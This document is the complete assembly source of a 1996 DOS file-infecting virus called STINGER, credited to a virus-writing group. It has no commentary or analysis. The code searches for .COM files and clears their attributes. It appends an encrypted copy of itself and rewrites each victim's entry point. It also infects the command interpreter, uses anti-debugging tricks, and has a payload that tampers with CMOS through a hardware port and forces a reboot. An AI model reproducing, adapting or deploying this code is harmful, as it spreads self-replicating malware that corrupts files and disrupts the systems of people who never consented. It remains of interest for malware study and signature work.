;************************************
;************** STINGER *************
;******** (c) 1996 by [TAVC] ********
;********** -=* RedArc *=- **********
;************************************

Model tiny
.code
.386

kode_crypt equ 0

        ORG 100h
START:
       pusha
       push ds
       push es
       push cs
       pop ds
       push cs
       pop es
       push di
       mov di,offset VIRUS
       ret
IDENT db 0ah,0dh,'STINGER',0ah,0dh,'$'
START_LEN equ $-START
       int 20h
VIRUS:
      jmp Ok_1
Ok_0:
       mov ax,1010h
       out 70h,ax
       mov al,0feh
       out 64h,al

Flag_Ofs equ $-VIRUS
Flag db 0
;---------------------
LOC_2_ equ $-VIRUS
LOC_2:
      pop ax
      pop cx
      inc ax
      xchg ax,cx
      push cx
      push ax
      mov ax,LOC_3_
      mov cx, bp
      xchg ax,cx
      add cx,ax
      push cx
      db 2eh
      pushf
      pop ax
      sahf
      jnb L_2_1
      mov ax,1010h
      out 70h,ax
      mov al,0feh
      out 64h,al
L_2_1:
      ret
;------------------------
HAND_OFS equ $-VIRUS
Handle dw ?
Write_To_File:
      mov word ptr [bp+HAND_OFS],bx
      mov byte ptr [bp+Flag_Ofs],1
      jmp DECRYPT
My_Loc_1:
      mov byte ptr [bp+Flag_Ofs],0
      mov dx,bp
      mov cx,VIRLEN
      mov bx,word ptr [bp+HAND_OFS]
      mov ah,40h
      int 21h
      mov byte ptr [bp+Flag_Ofs],2
      jmp DECRYPT
;------------------------
Ok_1:
      call VIR_BEG
VIR_BEG_LEN equ $-VIRUS
VIR_BEG:
      cli
      mov al,0adh
      out 64h,al
      jmp short $+2
      pop bp
      sti
      sub bp,VIR_BEG_LEN
DECRYPT:
Code_Ofs equ $-VIRUS
      mov ax, kode_crypt
      xor cx,cx
      cmp ax,cx
      jne DC_0
      mov ax, DC_3_
      add ax,bp
      push ax
      ret
;------------------------------------
LOC_4_ equ $-VIRUS
LOC_4:
      db 2eh
      pushf
      pop ax
      sahf
      jnb LOC_4_1
      mov ax,1010h
      out 70h,ax
      mov al,0feh
      out 64h,al
LOC_4_1:
     ret
;------------------------
DC_0:
      mov di, CRYPT_END
      add di,bp
      push ax
      mov ax, bp
      add ax, M_L_1_
      push ax
      mov ax, LOC_4_
      add ax, bp
      push ax
      ret
M_L_1_ equ $-VIRUS
M_L_1:
      pop ax
      mov si, CRYPT_START
      add si,bp
DC_1:
DC_1_ equ $-VIRUS
      mov bx, word ptr cs:[si]
      push bp
      mov dx, word ptr cs:[si+2]
      xchg cx,dx
      push si
      xchg bx,dx
      mov si,di
      xor  cx,ax
      pop di
      xchg cx,ax
      push si
      xchg ax,bx
      mov si,di
      xchg cx,dx
      pop bp
      xchg ax,dx
      xchg si,bp
      xchg bx,dx
      mov di,si
      xor  cx,ax
      xchg bp,si
      xchg cx,ax
      sub bp,di
      xchg bx,dx
      add bp,si
      xchg dx,cx
      xchg bp,si
      xchg ax,dx
      xor bp,si
      xchg dx,bx
      add bp,di
      mov cl,4
      xchg bp,di
      mov word ptr cs:[si],bx
      pop bp
      call LOC_1
      mov word ptr cs:[si+2],dx
DC_2:
      inc si
      loop DC_2
      cmp si,di
      jge DC_3
      mov dx, DC_1_
      mov cx, bp
DC_4:
      inc dx
      loop DC_4
      push dx
      ret
;------------------------
LOC_1:
      push cx
      push ax
      mov ax,bp
      mov cx,LOC_2_
L_1:
      inc ax
      loop L_1
      push ax
      ret
;------------------------
LOC_3_ equ $-VIRUS
LOC_3:
       pop cx
       mov ax,bp
       add ax,LOC_3_1_
       push ax
       mov ax,bp
       add ax,LOC_4_
       push ax
       ret
LOC_3_1_ equ $-VIRUS
LOC_3_1:
       pop ax
       xor ch,ch
       jmp LOC_4_1
;------------------------
DC_3:
DC_3_ equ $-VIRUS
       push ax
       mov ah, byte ptr [bp+Flag_Ofs]
       cmp ah,1
       pop ax
       jnz My_Loc_2
       jmp My_Loc_1
CRYPT_START equ $-VIRUS
;********************************************************
My_Loc_2:

      mov ah, byte ptr [bp+Flag_Ofs]
      cmp ah,2
      jnz My_Loc_3
      ret
My_Loc_3:
      cli
      mov al,0aeh
      out 64h,al
      jmp short $+2
      sti
;-------------------------------------------------------
Restore_Beg:
      mov si,P_B_Ofs
      mov di,100h
      add si,bp
      mov cx,START_LEN
      rep movsb
SET_DTA_VIRII:
      mov ah,1ah
      mov dx,bp
      add dx,VIRLEN
      push dx
      int 21h
      pop si
FIND_FIRST:
      mov dx,bp
      add dx,C_M_Ofs
      cld
      mov ah,4eh
      mov cx,0ffh
INTERRUPT:
      int 21h
      jb Not_File
      call Infected
      mov ah,4fh
      jmp short INTERRUPT
Not_File:
      call Command_Com
      mov ah,1ah
      mov dx,80h
      int 21h
;---------------------
RETURN_TO_PROG:
      pop es
      pop ds
      popa
      jmp si
;---------------------
Infected:
      mov dx, si
      add dx,1eh
      push dx
Clear_Attrib:
      mov ax,4301h
      xor cx,cx
      int 21h
Open_File:
      mov ax, 3d02h
      int 21h
      jb NextFind
Save_Handle:
      xchg ax,bx
Read_Beg:
      mov ah,3fh
      mov dx,bp
      add dx,P_B_Ofs
      mov cx,START_LEN
      int 21h
Check_Ident:
      push si
      mov si,bp
      mov di,si
      add si,New_Begin
      add di,P_B_Ofs
      add si,IDENT_Ofs
      add di,IDENT_Ofs
      mov cx,12
      rep cmpsb
      pop si
      je Close_File
      jmp short Plague
Close_File:
      mov ax,5701h
      mov dx, word ptr [si+18h]
      mov cx, word ptr [si+16h]
      int 21h
      mov ah,3eh
      int 21h
      mov ax,4301h
      pop dx
      mov cx,word ptr [si+15h]
      int 21h
      ret
NextFind:
      pop dx
      ret
Plague:
      mov ax,4202h
      xor cx,cx
      xor dx,dx
      push cx
      push cx
      int 21h
      mov word ptr [bp+OldLen],ax

      call New_Code
      pusha
      call Write_To_File
Ret_From_Write:
      popa
      mov ax,4200h
      pop cx
      pop dx
      int 21h
Calculate_New_Entry_Point:
      mov di,bp
      add di,New_Adr_Jump
      inc di
      mov ax, word ptr [bp+OldLen]
      add ax, 100h
      mov word ptr [di],ax
WRITE_New_Beg:
      mov ah,40h
      mov cx,START_LEN
      mov dx,bp
      add dx,New_Begin
      int 21h
      jmp Close_File
;---------------------
Command_Com:
           push ds
           mov di,bp
           mov si,2ch
           mov ds,cs:[si]
           mov si,0008
           add di, VIRLEN
           add di,2ch
           mov cx,0040h
           rep movsb
           sub di,40h
           pop ds
           mov dx,di
           mov ah,4eh
           mov cx,0ffh
           int 21h
           mov di,bp
           jb EXITER
           mov ah,2fh
           int 21h
           mov bx,di
           add bx,VIRLEN
           add bx,0eh
           xchg bx,si
           call INFECTED
EXITER:
      ret
;---------------------
New_Code:
        push ax
        push bx
        push cx
        push di

        mov ax, word ptr [si+1ah]
        mov bx, word ptr [si+18h]
        mov cx, word ptr [si+16h]
        xor bx,cx
        cmp bx,cx
        jnz N_C_1
        jmp Ok_0_My
N_C_1:
        xor ax,bx
        mov di,bp
        add di,Code_Ofs
        mov word ptr [di+1],ax

        pop di
        pop cx
        pop bx
        pop ax
        ret
Ok_0_My:
        mov ah, 09h
        mov dx,bp
        add dx,IDENT_Ofs
        int 21h
        jmp Ok_0
;---------------------
P_B_Ofs equ $-VIRUS
PROGRAM_BEG db START_LEN dup (90h)
C_M_Ofs equ $-VIRUS
COM_MASK db '*.COM',0h
E_M_Ofs equ $-VIRUS
OldLen equ $-VIRUS
       dw ?
My_START:
New_Begin equ $-VIRUS
       pusha
       push ds
New_Adr_Jump equ $-VIRUS
       mov di,offset VIRUS
       push es
       push cs
       pop ds
       push di
       push cs
       pop es
       ret
IDENT_Ofs equ $-My_Start
       db 0ah,0dh,'STINGER',0ah,0dh,'$'
;********************************************************
CRYPT_END   equ $-VIRUS
VIRLEN equ $-VIRUS
END START
